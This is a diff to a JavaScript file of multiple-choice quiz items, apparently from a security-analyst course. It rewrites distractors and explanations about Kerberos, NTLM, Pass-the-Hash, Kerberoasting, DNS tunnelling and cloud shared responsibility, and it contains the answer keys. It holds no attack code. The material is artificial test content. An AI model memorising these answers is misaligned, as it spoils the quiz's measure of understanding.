@@ -4546,7 +4546,7 @@ const NEW_TOPIC_LESSONS = [
           }
         ],
         "answer": "a",
-        "explanation": "SSH became the standard because it encrypts the whole session — passwords and commands included — while Telnet transmitted everything as plain readable text that anyone capturing traffic could steal; SSH listens on port 22. The other options wrongly attribute DHCP's address assignment (port 67), DNS's name resolution (port 53), or SMB's file sharing (port 445) to SSH."
+        "explanation": "Correct: SSH won out because it encrypts the whole session — credentials and commands alike — while Telnet transmitted everything in cleartext; SSH listens on TCP port 22. The second option borrows DHCP's job and port (67): SSH does not hand out IP addresses. The third option borrows DNS's job and port (53): SSH does not resolve names. The fourth option borrows SMB's job and port (445): file sharing on 445 is SMB, not SSH."
       },
       {
         "question": "An internet-facing Windows server shows successful logons with Event ID 4624 Logon Type 10 arriving from IP addresses in several different countries within the same hour, immediately preceded by a burst of Event ID 4625 failures. Which protocol and attack pattern does this most likely represent?",
@@ -4556,20 +4556,20 @@ const NEW_TOPIC_LESSONS = [
             "value": "a"
           },
           {
-            "label": "DNS on port 53 — a resolver misconfiguration causing lookup failures that Windows mistakenly logs as remote logon events.",
+            "label": "SMB on port 445 — lateral movement attempts, which Windows records as the same Type 10 interactive logons from remote hosts.",
             "value": "b"
           },
           {
-            "label": "SMTP on port 25 — an open mail relay forwarding spam, which Windows records using the same event IDs as remote desktop logons.",
+            "label": "WinRM on port 5985 — remote PowerShell sessions, which generate Type 10 interactive logons spread across many hosts.",
             "value": "c"
           },
           {
-            "label": "NTP on port 123 — a clock-synchronisation failure that produces logon-failure events unrelated to any actual authentication attempt.",
+            "label": "VPN on port 1194 — remote-access tunnels that Windows logs as Type 10 whenever users connect from abroad.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Logon Type 10 (RemoteInteractive) specifically denotes an RDP session, so successful logons of this type from multiple countries within an hour, preceded by failed-logon bursts (4625), matches brute-force or credential-stuffing against an internet-exposed RDP service on port 3389 — a top ransomware initial-access vector. DNS lookup failures do not generate 4624/4625 logon events. SMTP relay abuse does not produce Windows interactive-logon events. NTP clock issues can cause Kerberos ticket failures, but they do not generate RemoteInteractive logon events either."
+        "explanation": "Correct: Logon Type 10 is RemoteInteractive, the signature of RDP (port 3389); Type 10 successes from many countries right after a 4625 failure burst is brute-force or credential-stuffing against exposed RDP. The SMB option is wrong on the logon type — remote SMB access logs as Type 3 (Network), not Type 10. The WinRM option likewise maps to network logons (Type 3), not interactive Type 10. The VPN option is wrong too: a VPN tunnel does not itself produce Windows Type 10 interactive logon events."
       },
       {
         "question": "A domain-wide spike in Kerberos authentication failures begins suddenly, with no recent password resets, account lockouts, or group membership changes. Which protocol should an analyst check first, and why?",
@@ -4579,66 +4579,66 @@ const NEW_TOPIC_LESSONS = [
             "value": "a"
           },
           {
-            "label": "SMB — file-share connectivity problems are the most common cause of domain-wide Kerberos ticket failures in a Windows environment.",
+            "label": "SMB — if clients cannot reach the file shares that hold their Kerberos tickets, authentication fails across the domain.",
             "value": "b"
           },
           {
-            "label": "HTTP — a web server outage typically prevents Kerberos tickets from being issued anywhere in the domain.",
+            "label": "DNS — a slow resolver adds enough latency that Kerberos tickets expire before clients manage to use them.",
             "value": "c"
           },
           {
-            "label": "DHCP — expired IP address leases directly invalidate previously issued Kerberos tickets across the domain.",
+            "label": "DHCP — expired IP address leases change client addresses, which invalidates the Kerberos tickets already issued to them.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Kerberos ticket timestamps are how it detects replay attacks, so authentication fails once a client's clock drifts beyond the domain's configured maximum skew (5 minutes by default) — making NTP, and specifically the time source such as the PDC Emulator, the first thing to check for a sudden, unexplained domain-wide spike in Kerberos failures. SMB share issues, HTTP outages, and DHCP lease expirations do not directly invalidate Kerberos ticket validation in this way."
+        "explanation": "Correct: Kerberos is time-sensitive, so a sudden domain-wide failure spike with nothing else changed points to clock drift beyond the default 5-minute skew — an NTP problem to check first. The SMB option invents a mechanism: tickets are issued by the KDC and cached in memory, not stored on file shares. The DNS option is wrong on cause — resolver latency does not expire valid tickets; a real DNS problem would stop clients locating the KDC entirely, not cause skew-style failures. The DHCP option is wrong because Kerberos tickets are not bound to a client's IP lease."
       },
       {
         "question": "During a DNS-tunnelling investigation, which record type would you scrutinise first, and why is it the natural choice for smuggling data?",
         "options": [
           {
-            "label": "The TXT record, because it stores free-form text strings, so attackers can encode stolen data or command-and-control instructions directly inside unusually long or high-volume TXT queries and answers.",
+            "label": "The TXT record, because it stores free-form text, so attackers encode stolen data or C2 instructions inside unusually long or high-volume TXT queries and answers.",
             "value": "a"
           },
           {
-            "label": "The A record, because it only ever returns a fixed four-byte IPv4 address and therefore offers attackers the largest possible hidden channel for moving files out of the network unnoticed.",
+            "label": "The A record, because each reply returns a four-byte IPv4 address that attackers chain together into a high-capacity hidden channel.",
             "value": "b"
           },
           {
-            "label": "The MX record, because mail-exchanger entries are the only DNS records that malware is technically able to read.",
+            "label": "The CNAME record, because alias chains let an attacker redirect a lookup through many hops and leak a little data at each one.",
             "value": "c"
           },
           {
-            "label": "The PTR record, because reverse lookups are encrypted and cannot be inspected by defenders.",
+            "label": "The MX record, because mail-exchanger lookups are the only DNS queries that are allowed to leave the network to external servers.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "TXT records hold arbitrary free-form text, which makes them the classic carrier for DNS tunnelling: malware encodes data or C2 instructions inside TXT queries/answers, so long or high-volume TXT activity is a core tunnelling signal. A records return only a small fixed IPv4 value. MX records route mail and are not a data channel. PTR records are plaintext reverse lookups, not encrypted."
+        "explanation": "Correct: TXT records hold arbitrary text, giving them the capacity attackers want, so encoded data or C2 instructions in unusually long or high-volume TXT traffic is the natural first thing to scrutinise. The A-record option has the reasoning backwards — a four-byte IPv4 answer is a tiny container, not a high-capacity channel. The CNAME option describes alias chaining, which is not how tunnelling moves payload data. The MX option rests on a false premise: many record types traverse to external servers, and MX is not a privileged exfiltration path."
       },
       {
         "question": "In a web-server log you see hundreds of POST requests to /login answered mostly with 401, then a single 302. What does this pattern most likely represent?",
         "options": [
           {
-            "label": "A credential-stuffing attack: repeated login submissions (POST) are rejected as unauthorized (401) until one succeeds and the server redirects (302) the now-authenticated session onward.",
+            "label": "A credential-stuffing attack: repeated login POSTs are rejected with 401 until one succeeds and the server issues a 302 redirecting the now-authenticated session.",
             "value": "a"
           },
           {
-            "label": "Normal browsing, because 401 simply means the page loaded correctly and 302 confirms the images finished downloading.",
+            "label": "One user who forgot their password retrying a few times, since each wrong attempt returns 401 and the final 302 is their successful login.",
             "value": "b"
           },
           {
-            "label": "A server hardware failure, since 401 and 302 are both server-error codes in the 5xx family.",
+            "label": "A vulnerability scanner testing the login page, where the 401s are probes and the 302 is the scanner following a redirect it discovered.",
             "value": "c"
           },
           {
-            "label": "A DNS misconfiguration, because status codes are produced by the resolver rather than the web server.",
+            "label": "A load balancer health check on /login, where the 401s are expected probe responses and the 302 marks a backend node coming back online.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "401 Unauthorized is a 4xx client-error meaning failed authentication; many POSTs to /login returning 401 is repeated failed logins, and a following 302 redirect marks a successful login being sent onward. That mostly-401-then-302 shape is classic credential stuffing. 401 is not success, 401/302 are not 5xx server errors, and status codes come from the web server, not DNS."
+        "explanation": "Correct: a flood of login POSTs answered with 401 (unauthorized) ending in a 302 redirect is the exact shape of credential stuffing that finally broke in — the 302 hands the now-authenticated session onward. The forgot-password option cannot account for hundreds of attempts; a real user tries a handful. The scanner option is wrong because a vulnerability scanner probes for flaws rather than submitting masses of login credentials that culminate in an authenticated redirect. The health-check option is wrong too: load-balancer probes are lightweight GETs, not hundreds of credential POSTs to /login."
       }
     ],
     "references": [
@@ -4706,188 +4706,188 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "A junior analyst asks you what fundamentally distinguishes Kerberos from NTLM in how they authenticate a user. What is the single most important structural difference?",
+        "question": "A junior analyst asks what fundamentally distinguishes Kerberos from NTLM in how they authenticate a user. Which statement describes the core structural difference correctly?",
         "options": [
           {
-            "label": "NTLM encrypts network traffic while Kerberos leaves it in plain text, which is why Kerberos is considered the older and less secure of the two protocols.",
+            "label": "NTLM relies on the DC issuing time-limited tickets, while Kerberos is a direct challenge-response between client and server",
             "value": "a"
           },
           {
-            "label": "Kerberos relies on a trusted third party (the KDC) that issues time-limited tickets, whereas NTLM is a direct challenge-response between the client and server.",
+            "label": "Kerberos relies on a trusted third party (the KDC) issuing time-limited tickets; NTLM is a challenge-response the DC only verifies",
             "value": "b"
           },
           {
-            "label": "NTLM requires the client and server clocks to be synchronized within five minutes, while Kerberos works regardless of any time difference between them.",
+            "label": "Kerberos verifies only the client, while NTLM verifies both sides, which is why NTLM is still kept as the fallback",
             "value": "c"
           },
           {
-            "label": "Kerberos sends the user's plaintext password to each server it contacts, while NTLM keeps the password entirely on the domain controller at all times.",
+            "label": "Kerberos sends credentials only to the domain controller, while NTLM sends the NT hash itself to every server contacted",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The core difference is the trust model: Kerberos uses a trusted third party, the KDC, to issue time-limited tickets, while NTLM is a direct challenge-response between client and server with the DC only verifying the answer. The claim that NTLM encrypts while Kerberos is plaintext reverses reality and is false. The clock-synchronization option has the clock dependency backwards — it is Kerberos, not NTLM, that needs synchronized clocks. The 'Kerberos sends the plaintext password' option is wrong because neither protocol sends the plaintext password to servers."
+        "explanation": "The core difference is the trust model: Kerberos is built around the KDC, a trusted third party that issues time-limited tickets, while NTLM is a direct challenge-response between client and server in which the DC is only consulted to check the answer. The first distractor swaps the two protocols. The mutual-authentication option is also reversed: Kerberos can verify both sides and NTLM verifies neither server identity. NTLM does not send the NT hash itself; the client sends a response computed from it, which is exactly why the hash never crosses the wire yet is still enough to authenticate."
       },
       {
-        "question": "An attacker steals a user's NT hash from a machine's memory and then successfully authenticates to a file server as that user, without ever learning the actual password. Which protocol's design makes this Pass-the-Hash attack possible, and why?",
+        "question": "An attacker steals a user’s NT hash from a machine’s memory and then authenticates to a file server as that user without ever learning the password. Which protocol design makes this Pass-the-Hash possible, and why?",
         "options": [
           {
-            "label": "Kerberos, because its service tickets contain the user's plaintext password, which the attacker extracted directly from the file server's memory.",
+            "label": "Kerberos, because service tickets are encrypted with the user’s NT hash, so the hash lets the attacker open and reuse them",
             "value": "a"
           },
           {
-            "label": "NTLM, because the password-derived hash is effectively the credential, so possessing the hash is enough to authenticate without the plaintext password.",
+            "label": "NTLM, because the response to the challenge is computed from the NT hash alone, so holding it is as good as the password",
             "value": "b"
           },
           {
-            "label": "Kerberos, because the KDC issues a new hash to every service, allowing a stolen hash to be replayed against any server in the domain at will.",
+            "label": "NTLM, because each server stores every user’s NT hash locally, so a hash taken from that server lets anyone log in there",
             "value": "c"
           },
           {
-            "label": "NTLM, because it transmits the user's plaintext password across the network in every challenge, letting the attacker capture and reuse it.",
+            "label": "NTLM, because the client sends the plaintext password in its third message, which the attacker captured and reused",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Pass-the-Hash works against NTLM because the NT hash is effectively the credential: the challenge is answered using the hash, so an attacker holding the hash can authenticate without ever knowing the plaintext password. The plaintext-in-Kerberos-tickets option is wrong because Kerberos tickets do not contain plaintext passwords. The 'KDC issues a new hash' option misdescribes how the KDC works. The claim that NTLM sends plaintext passwords is wrong because NTLM specifically avoids sending the plaintext password over the network — that is the whole point of the hash."
+        "explanation": "In NTLM the client answers the server’s challenge using the NT hash, so the hash is effectively the credential: whoever holds it can produce a valid response without the plaintext. A service ticket is encrypted with the service account’s key, not the user’s hash. A member server does not store everyone’s hash; it forwards the challenge and response to a domain controller for checking (Event 4776). NTLM never sends the plaintext password; avoiding that is the purpose of the challenge-response design."
       },
       {
-        "question": "While reviewing Domain Controller logs you notice a single user account generating a burst of Event ID 4769 (Kerberos service ticket requests) for many different services in a short window. What attack pattern should you most suspect?",
+        "question": "On a domain controller you see one user account generate Event 4769 (service ticket requested) for dozens of unrelated services, all within two seconds and all successful. What should you most suspect?",
         "options": [
           {
-            "label": "NTLM relay, because 4769 records the moment an attacker forwards a captured NTLM response to a second server to authenticate as the victim.",
+            "label": "Password spraying: one password tried once against many service accounts, each attempt logged as a 4769",
             "value": "a"
           },
           {
-            "label": "A password spray over NTLM, because 4769 is the event written each time a single password is tried against many different user accounts.",
+            "label": "Overpass-the-Hash: a stolen NT hash being exchanged for tickets, which the DC records as many 4769s",
             "value": "b"
           },
           {
-            "label": "Kerberoasting, because requesting many service tickets lets an attacker extract them and crack the service accounts' passwords offline.",
+            "label": "Kerberoasting: service tickets gathered for many SPNs so the service-account passwords can be cracked offline",
             "value": "c"
           },
           {
-            "label": "A Golden Ticket forgery, because 4769 is logged only when an attacker creates a forged TGT using the stolen KDC master key.",
+            "label": "Normal single sign-on: the user’s TGT being used to open their mapped drives and apps right after logon",
             "value": "d"
           }
         ],
         "answer": "c",
-        "explanation": "A single account requesting many service tickets (Event 4769) is the classic Kerberoasting pattern: the attacker collects service tickets and cracks the service accounts' passwords offline. The NTLM relay option is wrong because NTLM relay is an NTLM technique, not a Kerberos 4769 event. The NTLM password-spray option describes password spray, which is not what 4769 records. The Golden Ticket option is wrong because 4769 logs service-ticket requests, not TGT forgery, which concerns the TGT (4768) flow."
+        "explanation": "One account requesting service tickets for dozens of unrelated SPNs in a couple of seconds is the Kerberoasting shape: a tool collecting tickets to crack the service-account passwords offline. A password spray shows up as failed pre-authentication (4771 with 0x18) across many accounts, not as successful 4769s. Overpass-the-Hash turns a hash into a TGT, which is a 4768 request. Normal single sign-on produces a few 4769s spread over minutes as a person opens resources, not dozens of unrelated services in two seconds."
       },
       {
-        "question": "In a healthy Active Directory domain, under which condition will Windows normally fall back to NTLM instead of using Kerberos, and why should that catch an analyst's attention?",
+        "question": "In a healthy domain (clients domain-joined, DCs reachable, clocks in sync), which condition makes Windows fall back to NTLM, and is also one an attacker can deliberately trigger?",
         "options": [
           {
-            "label": "When a client connects to a resource by its IP address rather than hostname, because no SPN can be looked up; attackers may force this to enable relay or pass-the-hash.",
+            "label": "The client reaches the server by its IP address rather than its hostname, so no SPN can be looked up",
             "value": "a"
           },
           {
-            "label": "When the client and the domain controller have perfectly synchronized clocks, because matching timestamps disable Kerberos and require the NTLM fallback instead.",
+            "label": "The client’s clock runs two minutes ahead of the DC’s, which is enough to make Kerberos pre-auth fail",
             "value": "b"
           },
           {
-            "label": "When a user logs into a domain-joined machine by hostname with a reachable DC, because that is precisely the scenario Kerberos is unable to handle.",
+            "label": "The target is a member server, not a DC, so it cannot validate a Kerberos service ticket by itself",
             "value": "c"
           },
           {
-            "label": "When the domain controller is fully reachable and healthy, because a working DC always forces every authentication onto the NTLM path by design.",
+            "label": "The user’s TGT has passed its ten-hour lifetime, so Windows switches to NTLM instead of asking again",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Connecting by IP address instead of hostname means Windows cannot look up the service's SPN, so it falls back to NTLM; attackers sometimes force NTLM this way to enable relay or pass-the-hash, which is why it warrants attention. The synchronized-clocks option is backwards — synchronized clocks help Kerberos, not disable it. Logging in by hostname with a reachable DC describes the exact scenario where Kerberos works, not where it fails. The 'healthy DC forces NTLM' option is false because a healthy, reachable DC is what enables Kerberos, not NTLM."
+        "explanation": "Kerberos needs the service’s SPN, which Windows derives from the hostname; connecting by IP address leaves nothing to look up, so it falls back to NTLM, and attackers force this to enable relay or Pass-the-Hash. A two-minute offset is inside Kerberos’s roughly five-minute tolerance, so it does not cause a fallback. Member servers validate service tickets themselves, because the ticket is encrypted for them by the KDC; that is why they never need to contact the DC in real time. An expired TGT is simply replaced with a new one from the KDC (a new 4768), not swapped for NTLM."
       },
       {
-        "question": "In your DC logs, a single service account requests Kerberos service tickets (Event 4769) for thirty different SPNs within one second, all successful. What does this timeline most likely indicate, and why is the rate itself meaningful?",
+        "question": "The DC log shows three Event 4776 successes for svc-backup within one second, from the workstations FIN-LAPTOP-09, HR-LAPTOP-22 and IT-LAPTOP-04. svc-backup normally runs on two backup servers and authenticates with Kerberos. What is the most likely explanation?",
         "options": [
           {
-            "label": "Normal application startup, because service accounts always request every SPN in the domain once immediately after a server reboot.",
+            "label": "A password spray: one common password tried against svc-backup from three hosts, each hit logged as 4776",
             "value": "a"
           },
           {
-            "label": "Kerberoasting, because a human clicking through applications could never generate that many distinct service-ticket requests within a single second.",
+            "label": "Pass-the-Hash: svc-backup’s NT hash was stolen on one host and is being replayed over NTLM from others",
             "value": "b"
           },
           {
-            "label": "A clock synchronization failure, because Event 4769 is logged automatically every time the domain controller's time drifts out of tolerance.",
+            "label": "Kerberoasting: svc-backup’s service ticket being requested from three hosts so it can be cracked offline",
             "value": "c"
           },
           {
-            "label": "A password reset cascade, because changing one account's password forces the domain controller to reissue tickets for every service at once.",
+            "label": "Clock drift on the three laptops, so the backup agent there quietly fell back from Kerberos to NTLM",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Correct: thirty distinct service-ticket requests within one second is far faster than any human workflow, and matches an automated tool systematically requesting tickets for every SPN it can find — the Kerberoasting pattern. The 'normal application startup' option invents a reboot behavior that does not exist. The 'clock synchronization failure' option misattributes 4769, which logs service-ticket requests, not clock-drift events. The 'password reset cascade' option is wrong because a password reset does not trigger mass ticket reissuance across unrelated services."
+        "explanation": "A service account that normally lives on two servers and uses Kerberos suddenly validating over NTLM (4776) from three unrelated user laptops in the same second fits a stolen NT hash being replayed from several machines. A password spray tries one password across many accounts and mostly produces failures; here one account succeeds every time. Kerberoasting shows up as 4769 service-ticket requests, not NTLM validations. Clock drift can cause an NTLM fallback, but it does not explain a backup service account authenticating from user laptops it never runs on."
       },
       {
-        "question": "An attacker coerces a server into authenticating over NTLM and forwards that authentication to a third system, logging in as the coerced server's account. Which NTLM property makes this relay possible, and which control most directly defeats it?",
+        "question": "An attacker coerces a server into authenticating over NTLM and forwards that authentication to a third system, logging in as the coerced server’s account. Which NTLM property makes this relay possible, and which control most directly defeats it?",
         "options": [
           {
-            "label": "NTLM encrypts the user's plaintext password during the challenge, so an attacker who decrypts it in transit can reuse it anywhere; enabling TLS on the domain controller is the only fix that helps.",
+            "label": "No mutual authentication, and the response is not bound to a target; enforcing clock sync within five minutes stops it",
             "value": "a"
           },
           {
-            "label": "NTLM has no mutual authentication and does not bind the response to a target, so it can be forwarded to another server; SMB signing and Extended Protection for Authentication defeat relay by binding it to the intended service.",
+            "label": "No mutual authentication, and the response is not bound to a target; SMB signing and EPA tie it to the intended service",
             "value": "b"
           },
           {
-            "label": "NTLM depends on synchronized clocks, so an attacker who skews the server's time can replay the captured response indefinitely; strictly enforcing time synchronization stops the relay entirely.",
+            "label": "The response carries the NT hash itself, so it is valid anywhere; enabling Credential Guard on the client stops it",
             "value": "c"
           },
           {
-            "label": "NTLM issues a signed, KDC-encrypted ticket that every server in the domain will honour, so the correct fix is simply to shorten that ticket's lifetime on the KDC to a few minutes.",
+            "label": "The response can be cracked back to the password offline; enforcing long, complex passwords stops it",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Relay works because NTLM provides no mutual authentication and never binds the client's response to a specific target, so the material can be forwarded to a different server. SMB signing and EPA (channel/service binding) defeat it by tying the authentication to the intended service. The 'encrypts the plaintext password' option is wrong — NTLM never sends or encrypts the plaintext password in transit. The clock-skew option describes a Kerberos clock dependency, not NTLM. The 'shorten the ticket lifetime' option invents Kerberos-style tickets; NTLM issues none."
+        "explanation": "Relay works because NTLM has no mutual authentication and nothing binds the response to the server it was meant for, so it can be forwarded elsewhere. SMB signing and Extended Protection for Authentication (channel or service binding) defeat it by tying the authentication to the intended service. Clock sync is a Kerberos requirement; NTLM does not depend on timestamps. The response is computed from the hash, not the hash itself, and Credential Guard protects secrets in memory rather than stopping a live response being forwarded. Offline cracking is a different attack; relay never needs the password, so password strength does not stop it."
       },
       {
-        "question": "A 4769 event shows a service ticket requested for a service account using ticket encryption type 0x17, on a domain you know is otherwise fully AES. Why is this a high-fidelity Kerberoasting signal?",
+        "question": "A 4769 event shows a service ticket for svc-sql issued with Ticket Encryption Type 0x17, on a domain where every client and service supports AES. What does this field most likely tell you?",
         "options": [
           {
-            "label": "0x17 is RC4, a weak cipher that is much faster to crack offline than AES, so an attacker deliberately downgrades the service ticket to RC4 to make cracking the service account's password feasible.",
+            "label": "0x17 is RC4-HMAC, far faster to crack offline than AES, so the requester likely downgraded the ticket on purpose",
             "value": "a"
           },
           {
-            "label": "0x17 is the strongest AES variant, and Kerberoasting only ever targets tickets that cannot be cracked, so the strength itself proves malicious intent.",
+            "label": "0x17 means svc-sql’s password has expired, so the ticket was issued with a stale key that is easy to reuse",
             "value": "b"
           },
           {
-            "label": "0x17 is a Kerberos result code meaning the password expired, which always indicates that an account has been compromised.",
+            "label": "0x17 is AES256, the type Kerberoasting tools request because those tickets carry the service password hash",
             "value": "c"
           },
           {
-            "label": "0x17 means the domain controller was offline, so the ticket must have been forged as a Golden Ticket.",
+            "label": "0x17 shows a legacy client limited to RC4, so it is a hygiene finding rather than an attack sign",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Ticket encryption type 0x17 is RC4-HMAC, a weak cipher that cracks far faster offline than AES (0x11/0x12). Kerberoasting works best against RC4, so an attacker forces a downgrade to it; an RC4 service ticket on an otherwise all-AES domain is a strong Kerberoasting indicator. 0x17 is not AES and not the strongest option; as an encryption type it is not a result code; and it does not indicate the DC was offline."
+        "explanation": "In the Ticket Encryption Type field, 0x17 is RC4-HMAC, which cracks much faster offline than AES (0x11/0x12). Since every system here supports AES, an RC4 service ticket means someone asked for the weak cipher, which is the Kerberoasting downgrade. KDC_ERR_KEY_EXPIRED is also 0x17, but it is a result code in the failure field, not an encryption type, and this ticket was issued successfully. AES256 is 0x12. The legacy-client reading does not fit a domain where every client supports AES."
       },
       {
-        "question": "Across your domain controllers you see many 4768 failures with result code 0x6 (KDC_ERR_C_PRINCIPAL_UNKNOWN) spread across dozens of different account names in a short window. What does this most likely indicate?",
+        "question": "Across your domain controllers you see many 4768 failures with result code 0x6 (KDC_ERR_C_PRINCIPAL_UNKNOWN), spread across dozens of different account names in a short window. What does this most likely indicate?",
         "options": [
           {
-            "label": "Username enumeration: 0x6 means the account name does not exist, so many 0x6 failures across many different names is an attacker probing which usernames are valid.",
+            "label": "Username enumeration: most names tried do not exist, which is typically the recon step before a spray",
             "value": "a"
           },
           {
-            "label": "A clock-synchronisation outage, because 0x6 is the Kerberos code for time skew being greater than five minutes across the domain.",
+            "label": "A password spray against valid accounts: one common password failing once on each real account",
             "value": "b"
           },
           {
-            "label": "Normal password expiry, since 0x6 is issued whenever a large group of users are all prompted to change expired passwords at once.",
+            "label": "Clock skew across the domain: these clients are more than five minutes out of sync with the DCs",
             "value": "c"
           },
           {
-            "label": "A successful Golden Ticket attack, because forged TGTs always register as 0x6 successes on the domain controller.",
+            "label": "Mass password expiry: many users with expired passwords failing to obtain a TGT at the same time",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Result code 0x6 (KDC_ERR_C_PRINCIPAL_UNKNOWN) means the requested account name does not exist. Many 0x6 failures across many different names is classic username enumeration (or a spray run from a guessed user list, where the 0x6 entries are the names that do not exist). A spray against real accounts looks different: 4771 failures with 0x18 spread across many valid accounts. Clock skew is 0x25, not 0x6; expired passwords are 0x17; and 0x6 is a failure, not a Golden Ticket success."
+        "explanation": "Result code 0x6 means the requested account name does not exist, so many 0x6 failures across many names is username enumeration, or a spray working from a guessed user list where these are its misses. A spray against real accounts looks different: 4771 failures with 0x18 (pre-authentication failed) spread thinly across many valid accounts. Clock skew is 0x25 (KRB_AP_ERR_SKEW). Expired passwords are 0x17 (KDC_ERR_KEY_EXPIRED)."
       }
     ],
     "references": [
@@ -4972,162 +4972,162 @@ const NEW_TOPIC_LESSONS = [
         "question": "A new analyst assumes that because a company's servers run in AWS, Amazon is responsible for making sure none of the company's storage buckets are accidentally left open to the public internet. Why is this assumption wrong?",
         "options": [
           {
-            "label": "Amazon does secure bucket permissions for customers, so the analyst is actually correct and no internal monitoring for public buckets is ever needed.",
+            "label": "It is right for managed services like S3, where the provider owns the access settings as well as the hardware.",
             "value": "a"
           },
           {
-            "label": "Under shared responsibility the provider secures the infrastructure, but the customer owns their data and configuration, so a public bucket is the customer's failure to catch.",
+            "label": "The provider secures the infrastructure, but the customer owns its data and settings, so a public bucket is theirs to catch.",
             "value": "b"
           },
           {
-            "label": "Bucket permissions are set by the hardware layer that Amazon controls, so any public exposure is automatically a physical data-centre problem.",
+            "label": "The provider is responsible, but it only notifies customers after a breach, so the SOC still has to watch buckets too.",
             "value": "c"
           },
           {
-            "label": "Storage permissions are handled entirely by the network firewall, which the provider configures, so customers never influence whether a bucket is public.",
+            "label": "Bucket permissions are a network setting, so they belong to whichever team manages the VPC and its security groups.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The shared responsibility model splits duties: the provider secures the cloud infrastructure (hardware, hypervisor, managed-service backbone), while the customer secures their data, configuration, identities, and access rules. A public storage bucket is a customer-side configuration choice, so it is the SOC's job to detect it. The claim that Amazon secures bucket permissions is dangerously false. The hardware-layer and provider-firewall options misattribute a configuration setting to hardware or provider-run firewalls, which is not how storage permissions work."
+        "explanation": "Under the shared responsibility model the provider secures the cloud itself (data centres, hardware, hypervisor, the managed services' infrastructure), while the customer secures what it puts in the cloud: data, configuration, identities and access rules. A public bucket is a customer configuration choice, so detecting it is the SOC's job. \"It is right for managed services like S3\" is wrong: even on a managed service the provider runs the service, but the customer still sets who may access its data. \"The provider is responsible, but it only notifies customers\" is wrong: the provider is not responsible for a customer's misconfiguration at all and did nothing wrong. \"Bucket permissions are a network setting\" is wrong: bucket access is controlled by bucket and IAM policies, not by VPC security groups."
       },
       {
-        "question": "Why can a cloud provider record essentially every management action a user takes — whether that user clicked in the web console, typed an aws CLI command, or called the API from a script?",
+        "question": "Why can a cloud provider record essentially every management action a user takes, whether that user clicked in the web console, typed an aws CLI command, or called the API from a script?",
         "options": [
           {
-            "label": "Because the console, CLI, and scripts all ultimately perform the same underlying API calls, which the provider logs as who did what, where, and with what result.",
+            "label": "The console, CLI and scripts all make the same underlying API calls, which the provider logs with who, what, where and result.",
             "value": "a"
           },
           {
-            "label": "Because the provider installs a monitoring agent on every analyst's personal laptop that records their screen and keystrokes during any cloud session.",
+            "label": "The provider logs console clicks directly, while CLI and script actions are captured from each user's local shell history.",
             "value": "b"
           },
           {
-            "label": "Because only the web console produces logs, so organisations simply forbid the CLI and API to guarantee that all activity is fully captured.",
+            "label": "Each management action is rebuilt from VPC flow logs, which record every connection made to the provider's endpoints.",
             "value": "c"
           },
           {
-            "label": "Because cloud actions are recorded solely at the network packet level, so the provider reconstructs each action by reassembling raw traffic after the fact.",
+            "label": "Console actions are logged by default, and CLI and API calls are recorded once a separate audit setting is switched on.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The console and CLI are friendly wrappers around the provider's API, so every action collapses into an API call that services like CloudTrail and Azure Activity Log record, capturing the identity, action, resource, source IP, and outcome. The monitoring-agent option invents laptop surveillance that does not exist. The console-only logging option is false because the CLI and API are logged too, not forbidden. The packet-reassembly option is wrong because cloud auditing is built on API-call records, not packet reassembly."
+        "explanation": "The console and CLI are friendly wrappers around the provider's API, so every action becomes an API call that CloudTrail or the Azure Activity Log records with the identity, action, resource, source IP and outcome. \"Captured from each user's local shell history\" is wrong: the provider logs the API call on its side and never reads the user's machine. \"Rebuilt from VPC flow logs\" is wrong: flow logs show connections (IPs and ports), not which management action was performed. \"CLI and API calls are recorded once a separate audit setting is switched on\" is wrong: management events from all three are logged by default, because they are the same API calls. The separate setting the lesson describes is for data-plane events."
       },
       {
-        "question": "An EC2 instance's role has a policy granting s3:* on Resource: \"*\" — full access to every S3 action on every bucket in the account — even though the application only ever needs to read files from one specific bucket. What does this illustrate, and what should replace it?",
+        "question": "An EC2 instance's role has a policy granting s3:* on Resource: \"*\" (every S3 action on every bucket in the account), even though the application only ever reads files from one specific bucket. What does this illustrate, and what should change?",
         "options": [
           {
-            "label": "There is no concern, because roles automatically expire every hour regardless of the permissions written in the policy attached to them.",
+            "label": "Nothing needs to change, because a role's temporary credentials expire on their own and so limit any damage.",
             "value": "a"
           },
           {
-            "label": "This violates least privilege; the policy should be scoped to the specific actions it needs, like s3:GetObject, on the one bucket the application actually uses.",
+            "label": "It breaks least privilege; scope the policy to the needed action, such as s3:GetObject, on the one bucket used.",
             "value": "b"
           },
           {
-            "label": "The concern is that policies must always be written in XML, so this JSON policy will fail to attach and the instance will simply have no access.",
+            "label": "Replace the role with an IAM user and a long-lived access key, so every S3 action is traced to one named user.",
             "value": "c"
           },
           {
-            "label": "There is no concern, because attaching a policy to a role only affects console clicks and never governs API calls made by the running application.",
+            "label": "Keep s3:* but tighten the instance's security group, so that only this instance's network can reach the buckets.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "This is a textbook least-privilege violation: the policy should name the specific actions (like s3:GetObject) and the specific bucket the application needs, not a wildcard on everything. A leaked or abused credential from this role would otherwise have full S3 access account-wide. The 'roles expire every hour' option is wrong; expiration timing does not fix an overly broad policy. The XML-only option invents a JSON/XML restriction that does not exist in AWS. The 'console clicks only' option is false; the policy governs every API call the role makes, console or otherwise."
